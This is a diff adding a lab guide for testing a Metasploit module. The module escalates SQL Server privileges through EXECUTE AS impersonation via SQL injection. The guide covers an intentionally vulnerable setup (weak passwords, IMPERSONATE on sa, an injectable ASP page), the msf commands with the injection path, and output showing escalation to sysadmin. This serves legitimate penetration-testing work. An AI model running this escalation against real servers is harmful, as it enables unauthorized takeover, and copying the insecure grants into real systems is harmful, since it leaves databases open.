@@ -1,0 +1,134 @@
+SQL Server: Escalating privileges using EXCUTE AS via SQLi
+Lab Setup Guide
+
+Below I've provided some basic steps for setting up a SQL Server instance that can be used to replicate the scenario exploited by the mssql_escalate_executeas_sqli module.
+
+----------------------
+Database Setup
+----------------------
+
+1.	Download the Microsoft SQL Server Express install that includes SQL Server Management Studio.  It can be download at http://msdn.microsoft.com/en-us/evalcenter/dn434042.aspx
+
+2.	Install SQL Server by following the wizard, but make sure to enabled mixed-mode authentication and run the service as LocalSystem for the sake of the lab.
+
+3. Make sure to enable the tcp protocol so that module can connect to the listener.
+http://blogs.msdn.com/b/sqlexpress/archive/2005/05/05/415084.aspx
+
+4.	Log into the SQL Server with the "sa" account setup during installation using the SQL Server Management Studio application.
+
+5.	Press the "New Query" button and use the TSQL below to create a new users for the lab. 
+
+-- Create login 1
+CREATE LOGIN MyUser1 WITH PASSWORD = 'MyPassword!';
+
+-- Create login 2
+CREATE LOGIN MyUser2 WITH PASSWORD = 'MyPassword!';
+
+-- Create login 3
+CREATE LOGIN MyUser3 WITH PASSWORD = 'MyPassword!';
+
+6. Provide the MyUser1 login with permissions to impersonate MyUser2, MyUser3, and sa.
+USE master;
+GRANT IMPERSONATE ON LOGIN::sa to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser2 to [MyUser1];
+GRANT IMPERSONATE ON LOGIN::MyUser3 to [MyUser1];
+GO
+
+7.  Press the "New Query" button and use the TSQL below to create a database named "MyAppDb" for the lab. 
+
+-- Create database
+CREATE DATABASE MyAppDb
+
+8. Add a table with records
+
+-- Create table
+CREATE TABLE dbo.NOCList
+(ID INT IDENTITY PRIMARY KEY,SpyName varchar(MAX) NOT NULL,RealName varchar(MAX) NULL)
+
+-- Add sample records to table
+INSERT dbo.NOCList (SpyName, RealName)
+VALUES ('James Bond','Sean Connery')
+INSERT dbo.NOCList (SpyName, RealName)
+VALUES ('Ethan Hunt','Tom Cruise')
+INSERT dbo.NOCList (SpyName, RealName)
+VALUES ('Jason Bourne','Matt Damon')
+
+9.  Press the "New Query" button and use the TSQL below to assign "MyUser1" the "db_owner" role in the "MyAppDb" database.  
+
+-- Setup MyAppUsers the db_owner role in MyAppDb
+USE MyAppDb
+ALTER LOGIN [MyUser1] with default_database = [MyAppDb];
+CREATE USER [MyUser1] FROM LOGIN [MyUser1];
+EXEC sp_addrolemember [db_owner], [MyUser1];
+
+10. Log into the SQL Server using the MyUser1 account.
+
+11. Press the "New Query" button and use the TSQL below to confirm the permissions were added.
+
+SELECT b.name
+FROM sys.server_permissions a
+INNER JOIN sys.server_principals b
+ON a.grantor_principal_id = b.principal_id 
+WHERE a.permission_name = 'IMPERSONATE'
+
+12. Test out the impersonate in another query window with the TSQL below.
+
+select SYSTEM_USER
+select IS_SRVROLEMEMBER('sysadmin')
+execute as login = 'sa'
+select SYSTEM_USER
+select IS_SRVROLEMEMBER('sysadmin')
+revert
+select SYSTEM_USER
+select IS_SRVROLEMEMBER('sysadmin')
+
+
+----------------
+Web Server Setup
+----------------
+1. Setup a local IIS server 
+2. Make sure its configured to process asp pages
+3. Download testing.asp to web root from https://raw.githubusercontent.com/nullbind/Metasploit-Modules/master/testing2.asp
+4. Verify the page works by accessing: http://127.0.0.1/testing2.asp?id=1
+5. Verify the id parameter is injectable and error are returned: http://127.0.0.1/testing2.asp?id=@@version
+
+
+-------------------------
+Test MSF Module
+-------------------------
+1. Test out the module.  Verify escalation works.
+
+use auxiliary/admin/mssql/mssql_esclate_executeas_sqli
+set rhost <target ip>
+set rport <target IIS port>
+set GET_PATH /testing2.asp?id=1+and+1=[SQLi];--
+
+msf auxiliary(mssql_escalate_executeas_sqli) > run
+
+[*] 10.2.9.101:80 - Grabbing the database user name...
+[+] 10.2.9.101:80 - Database user: MyUser1
+[*] 10.2.9.101:80 - Checking if MyUser1 is already a sysadmin...
+[*] 10.2.9.101:80 - MyUser1 is NOT a sysadmin, let's try to escalate privileges.
+[*] 10.2.9.101:80 - Enumerating a list of users that can be impersonated...
+[+] 10.2.9.101:80 - 3 users can be impersonated:
+[*] 10.2.9.101:80 -   MyUser2
+[*] 10.2.9.101:80 -   MyUser3
+[*] 10.2.9.101:80 -   sa
+[*] 10.2.9.101:80 - Checking if any of them are sysadmins...
+[*] 10.2.9.101:80 -   MyUser2 is NOT a sysadmin
+[*] 10.2.9.101:80 -   MyUser3 is NOT a sysadmin
+[+] 10.2.9.101:80 -   sa is a sysadmin!
+[*] 10.2.9.101:80 - Attempting to impersonate sa...
+[+] 10.2.9.101:80 - Success! MyUser1 is now a sysadmin!
+[*] Auxiliary module execution completed
+
+2. Test out the module.  Verify that module stops if your already a sysadmin.
+
+msf auxiliary(mssql_escalate_executeas_sqli) > run
+
+[*] 10.2.9.101:80 - Grabbing the database user name...
+[+] 10.2.9.101:80 - Database user: MyUser1
+[*] 10.2.9.101:80 - Checking if MyUser1 is already a sysadmin...
+[-] 10.2.9.101:80 - MyUser1 is already a sysadmin, no escalation needed.
+[*] Auxiliary module execution completed
+msf auxiliary(mssql_escalate_executeas_sqli) >
